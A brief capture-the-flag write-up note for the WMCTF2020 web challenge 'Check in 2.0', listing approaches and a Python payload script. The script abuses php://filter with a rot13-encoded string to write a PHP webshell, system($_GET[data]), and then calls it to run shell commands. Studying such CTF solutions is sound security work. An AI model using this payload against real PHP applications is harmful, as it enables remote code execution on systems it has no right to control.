title:: CTFWEB/WP/WMCTF2020 Web Check in 2.0

- tags:: CTFWEB/伪协议
- # 思路
	- 官方题解新姿势： ((64673efa-c544-4ad7-9b9b-920b148d0b26))
	- 其他思路：可以使用zlib压缩，然后string.tolower破坏字节流，然后再解压
- # payload生成
	- ```python
	  filename = random_chars()[:5] + ".php"
	  r = base_get(url, params = {
	    "content": "php://filter/" + enc_dec.full_urlencode("string.rot13") + "|" + enc_dec.urldecode("%3C%3Fcuc%0Aflfgrz%28%24_TRG%5Bqngn%5D%29%3B%0A%3F%3E") + "/resource=" + filename
	  }, acceptable_code=None)
	  r = base_get(url + "sandbox/f9e1016a5cec370aae6a18d438dabfa5/" + filename, params = {
	    "data": "ls /"
	  }, acceptable_code=[200, 500])
	  print(r.status_code)
	  print(r.text)
	  ```